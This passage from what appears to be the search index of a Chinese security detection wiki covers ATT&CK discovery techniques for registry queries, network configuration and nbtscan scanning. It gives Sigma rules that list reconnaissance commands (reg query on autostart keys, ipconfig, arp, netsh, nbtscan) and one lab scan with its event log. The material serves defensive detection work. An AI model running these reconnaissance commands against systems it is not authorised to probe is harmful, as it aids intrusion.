\u5b89\u5168\u65e5\u5fd7\uff0c\u8fdb\u7a0b\u521b\u5efa\u3001\u5b50\u7236\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#sigma","text":"title: windows\u672c\u5730\u6267\u884creg query HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1012/T1012.md tags: T1012 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: 'C:\\Windows\\System32\\reg.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 Creatorprocessname: 'C:\\Windows\\System32\\cmd.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0 Processcommandline: - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices - reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\" - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\" - reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" - reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\" - reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run - reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run - reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\" - reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c\uff0c\u5b9e\u9645\u60c5\u51b5\u4e0b\uff0c\u4f60\u53ef\u4ee5\u5bf9\u4efb\u4f55\u6ce8\u518c\u8868\u67e5\u8be2\u884c\u4e3a\u8fdb\u884c\u68c0\u6d4b condition: selection level: low","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1012-win-%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E8%A1%A8/#_7","text":"MITRE-ATT&CK-T1012 https://attack.mitre.org/techniques/T1012/ Windows\u4e0breg\u547d\u4ee4\u8be6\u89e3 https://www.jb51.net/article/30078.htm","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/","text":"T1016-win-\u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u6709\u5173\u5176\u8bbf\u95ee\u7684\u7cfb\u7edf\u6216\u901a\u8fc7\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u53d1\u73b0\u7684\u7f51\u7edc\u914d\u7f6e\u548c\u8bbe\u7f6e\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u5b58\u5728\u51e0\u4e2a\u53ef\u7528\u4e8e\u6536\u96c6\u6b64\u4fe1\u606f\u7684\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\u3002\u793a\u4f8b\u5305\u62ecArp\uff0cipconfig /ifconfig\uff0cnbtstat\u548croute\u3002 \u6d4b\u8bd5\u6848\u4f8b windows\u4e0b\u6267\u884cArp\uff0cipconfig\uff0cnbtstat\u548croute\u547d\u4ee4 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows \u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0 description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1016/T1016.md tags: T1016 status: experimental author: 12306Bro logsource: product: windows service: security/sysmon detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 CommandLine: - ipconfig /all - netsh interface show interface - arp -a - nbtstat -n - net config - netsh advfirewall firewall show rule name=all level: medium \u5efa\u8bae \u5982\u679c\u4f60\u90e8\u7f72\u4e86sysmon\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\uff0c\u5f53\u7136\uff0c\u5176\u4ed6\u5177\u5907\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u529f\u80fd\u7684EDR\u4e5f\u53ef\u4ee5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1016 https://attack.mitre.org/techniques/T1016/","title":"T1016-win-\u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#t1016-win-","text":"","title":"T1016-win-\u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5bfb\u627e\u6709\u5173\u5176\u8bbf\u95ee\u7684\u7cfb\u7edf\u6216\u901a\u8fc7\u8fdc\u7a0b\u7cfb\u7edf\u7684\u4fe1\u606f\u53d1\u73b0\u7684\u7f51\u7edc\u914d\u7f6e\u548c\u8bbe\u7f6e\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u5b58\u5728\u51e0\u4e2a\u53ef\u7528\u4e8e\u6536\u96c6\u6b64\u4fe1\u606f\u7684\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\u3002\u793a\u4f8b\u5305\u62ecArp\uff0cipconfig /ifconfig\uff0cnbtstat\u548croute\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_1","text":"windows\u4e0b\u6267\u884cArp\uff0cipconfig\uff0cnbtstat\u548croute\u547d\u4ee4","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#sigma","text":"title: windows \u7cfb\u7edf\u7f51\u7edc\u914d\u7f6e\u53d1\u73b0 description: windows server 2016 references: - https://github.com/redcanaryco/atomic-red-team/blob/910a2a764a66b0905065d8bdedb04b37049a85db/atomics/T1016/T1016.md tags: T1016 status: experimental author: 12306Bro logsource: product: windows service: security/sysmon detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 CommandLine: - ipconfig /all - netsh interface show interface - arp -a - nbtstat -n - net config - netsh advfirewall firewall show rule name=all level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_6","text":"\u5982\u679c\u4f60\u90e8\u7f72\u4e86sysmon\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\uff0c\u5f53\u7136\uff0c\u5176\u4ed6\u5177\u5907\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u529f\u80fd\u7684EDR\u4e5f\u53ef\u4ee5\u3002","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1016-win-%E7%B3%BB%E7%BB%9F%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E5%8F%91%E7%8E%B0/#_7","text":"MITRE-ATT&CK-T1016 https://attack.mitre.org/techniques/T1016/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/","text":"T1018-win-\u68c0\u6d4bnbtscan\u6d3b\u52a8 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\uff0c\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u5176\u4ed6\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u7684\u903b\u8f91\u6807\u8bc6\u7b26\u6765\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\u3002\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u5b58\u5728\u7c7b\u4f3c\u7684\u529f\u80fd\u6765\u53ef\u4ee5\u5b9e\u73b0\u6b64\u76ee\u7684\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Ping\u6216net view\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\uff08\u4f8b\u5982\uff1aC:\\Windows\\System32\\Drivers\\etc\\hosts\u6216/etc/hosts\uff09\u6765\u53d1\u73b0\u4e3b\u673a\u540d\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684IP\u5730\u5740\u7684\u6620\u5c04\u3002 \u8be5bonjour\u534f\u8bae\u7279\u5b9a\u4e8emacOS\uff0c\u7528\u4e8e\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u4e2d\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u3002 \u6d4b\u8bd5\u6848\u4f8b Nbtscan.exe\u662f\u4e00\u6b3e\u7528\u4e8e\u626b\u63cfWindows\u7f51\u7edc\u4e0aNetBIOS\u540d\u5b57\u4fe1\u606f\u7684\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5bf9\u7ed9\u51fa\u8303\u56f4\u5185\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\u53d1\u9001NetBIOS\u72b6\u6001\u67e5\u8be2\uff0c\u5e76\u4e14\u4ee5\u6613\u8bfb\u7684\u8868\u683c\u5217\u51fa\u63a5\u6536\u5230\u7684\u4fe1\u606f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u54cd\u5e94\u7684\u4e3b\u673a\uff0cNBTScan\u5217\u51fa\u5b83\u7684IP\u5730\u5740\u3001NetBIOS\u8ba1\u7b97\u673a\u540d\u3001\u767b\u5f55\u7528\u6237\u540d\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u603b\u4e4b\uff0cNBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\12306br0\\Desktop\\test>nbtscan-1.0.35.exe 10.211.55.1/24 10.211.55.2 \\MACBOOKPRO-3EAA *timeout (normal end of scan) \u6d4b\u8bd5\u7559\u75d5 4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x135c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\test\\nbtscan-1.0.35.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xc68 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: nbtscan-1.0.35.exe 10.211.55.1/24 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4bnbtscan\u6d3b\u52a8 description: windows server 2016\u3001\u672c\u68c0\u6d4b\u89c4\u5219\u53c2\u8003Microsoft\u5a01\u80c1\u9632\u62a4\u56e2\u961f\u53d1\u5e03\u7684Operation Soft Cell\u5a01\u80c1\u5206\u6790\u62a5\u544a\uff0cSoft Cell\u884c\u52a8\u662f\u4e00\u7cfb\u5217\u9488\u5bf9\u5168\u7403\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u7528\u6237\u547c\u53eb\u65e5\u5fd7\u7684\u8fd0\u52a8\u3002\u8fd9\u4e9b\u653b\u51fb\u6700\u65e9\u53ef\u4ee5\u8ffd\u6eaf\u52302012\u5e74\u3002nbtscan.exe\u662f\u4e00\u79cd\u5408\u6cd5\u7684MS-DOS\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7528\u4e8e\u53d1\u73b0\u672c\u5730\u6216\u8fdc\u7a0bTCP/IP\u7f51\u7edc\u4e0a\u7684\u4efb\u4f55NETBIOS\u540d\u79f0\u670d\u52a1\u5668\u3002 references: https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md tags: T1018 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: '*nbtscan*.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 condition: selection level: low \u5efa\u8bae \u57fa\u4e8e\u975e\u7cfb\u7edf\u81ea\u5e26\u8fdb\u7a0b\u540d\u79f0\u7684\u68c0\u6d4b\u65b9\u6cd5\u59cb\u7ec8\u662f\u4e0d\u592a\u9760\u8c31\u7684\uff0c\u5f53\u653b\u51fb\u8005\u4fee\u6539\u8fdb\u7a0b\u540d\u79f0\u540e\uff0c\u5c31\u65e0\u6cd5\u901a\u8fc7\u8fdb\u7a0b\u540d\u79f0\u8fdb\u884c\u68c0\u6d4b\uff1b\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72sysmon\uff0c\u5229\u7528\u8fdb\u7a0bhash\u503c\u8fdb\u884c\u68c0\u6d4b\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1018 https://attack.mitre.org/techniques/T1018/ \u68c0\u6d4bnbtscan\u6d3b\u52a8 https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md Nbtscan\u4e0b\u8f7d http://unixwiz.net/tools/nbtscan.html \u8f6f\u8702\u7a9d\u884c\u52a8:\u9488\u5bf9\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u5168\u7403\u8fd0\u52a8 https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers","title":"T1018-win-\u68c0\u6d4bnbtscan\u6d3b\u52a8"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#t1018-win-nbtscan","text":"","title":"T1018-win-\u68c0\u6d4bnbtscan\u6d3b\u52a8"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u901a\u8fc7IP\u5730\u5740\uff0c\u4e3b\u673a\u540d\u6216\u7f51\u7edc\u4e0a\u5176\u4ed6\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u7cfb\u7edf\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u7684\u903b\u8f91\u6807\u8bc6\u7b26\u6765\u83b7\u53d6\u5176\u4ed6\u7cfb\u7edf\u7684\u5217\u8868\u3002\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u4e2d\u5b58\u5728\u7c7b\u4f3c\u7684\u529f\u80fd\u6765\u53ef\u4ee5\u5b9e\u73b0\u6b64\u76ee\u7684\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u53ef\u7528\u7684\u5b9e\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Ping\u6216net view\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u4f7f\u7528\u672c\u5730\u4e3b\u673a\u6587\u4ef6\uff08\u4f8b\u5982\uff1aC:\\Windows\\System32\\Drivers\\etc\\hosts\u6216/etc/hosts\uff09\u6765\u53d1\u73b0\u4e3b\u673a\u540d\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684IP\u5730\u5740\u7684\u6620\u5c04\u3002 \u8be5bonjour\u534f\u8bae\u7279\u5b9a\u4e8emacOS\uff0c\u7528\u4e8e\u5728\u540c\u4e00\u5e7f\u64ad\u57df\u4e2d\u53d1\u73b0\u5176\u4ed6\u57fa\u4e8eMac\u7684\u7cfb\u7edf\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_1","text":"Nbtscan.exe\u662f\u4e00\u6b3e\u7528\u4e8e\u626b\u63cfWindows\u7f51\u7edc\u4e0aNetBIOS\u540d\u5b57\u4fe1\u606f\u7684\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5bf9\u7ed9\u51fa\u8303\u56f4\u5185\u7684\u6bcf\u4e00\u4e2a\u5730\u5740\u53d1\u9001NetBIOS\u72b6\u6001\u67e5\u8be2\uff0c\u5e76\u4e14\u4ee5\u6613\u8bfb\u7684\u8868\u683c\u5217\u51fa\u63a5\u6536\u5230\u7684\u4fe1\u606f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u54cd\u5e94\u7684\u4e3b\u673a\uff0cNBTScan\u5217\u51fa\u5b83\u7684IP\u5730\u5740\u3001NetBIOS\u8ba1\u7b97\u673a\u540d\u3001\u767b\u5f55\u7528\u6237\u540d\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u4f46\u53ea\u80fd\u7528\u4e8e\u5c40\u57df\u7f51,NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002NBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\uff0c\u5982\u679c\u6709\u201dARP\u653b\u51fb\u201d\u5728\u505a\u602a\uff0c\u53ef\u4ee5\u627e\u5230\u88c5\u6709ARP\u653b\u51fb\u7684PC\u7684IP/\u548cMAC\u5730\u5740\u3002\u603b\u4e4b\uff0cNBTSCAN\u53ef\u4ee5\u53d6\u5230PC\u7684\u771f\u5b9eIP\u5730\u5740\u548cMAC\u5730\u5740\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_3","text":"C:\\Users\\12306br0\\Desktop\\test>nbtscan-1.0.35.exe 10.211.55.1/24 10.211.55.2 \\MACBOOKPRO-3EAA *timeout (normal end of scan)","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_4","text":"4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x135c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Users\\12306br0\\Desktop\\test\\nbtscan-1.0.35.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xc68 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: nbtscan-1.0.35.exe 10.211.55.1/24","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1018-win-%E6%A3%80%E6%B5%8Bnbtscan%E6%B4%BB%E5%8A%A8/#sigma","text":"title: \u68c0\u6d4bnbtscan\u6d3b\u52a8 description: windows server 2016\u3001\u672c\u68c0\u6d4b\u89c4\u5219\u53c2\u8003Microsoft\u5a01\u80c1\u9632\u62a4\u56e2\u961f\u53d1\u5e03\u7684Operation Soft Cell\u5a01\u80c1\u5206\u6790\u62a5\u544a\uff0cSoft Cell\u884c\u52a8\u662f\u4e00\u7cfb\u5217\u9488\u5bf9\u5168\u7403\u7535\u4fe1\u63d0\u4f9b\u5546\u7684\u7528\u6237\u547c\u53eb\u65e5\u5fd7\u7684\u8fd0\u52a8\u3002\u8fd9\u4e9b\u653b\u51fb\u6700\u65e9\u53ef\u4ee5\u8ffd\u6eaf\u52302012\u5e74\u3002nbtscan.exe\u662f\u4e00\u79cd\u5408\u6cd5\u7684MS-DOS\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7528\u4e8e\u53d1\u73b0\u672c\u5730\u6216\u8fdc\u7a0bTCP/IP\u7f51\u7edc\u4e0a\u7684\u4efb\u4f55NETBIOS\u540d\u79f0\u670d\u52a1\u5668\u3002 references: https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Discovery/detect-nbtscan-activity.md tags: T1018 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Newprocessname: '*nbtscan*.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u65b0\u8fdb\u7a0b\u540d\u79f0 condition: selection level: 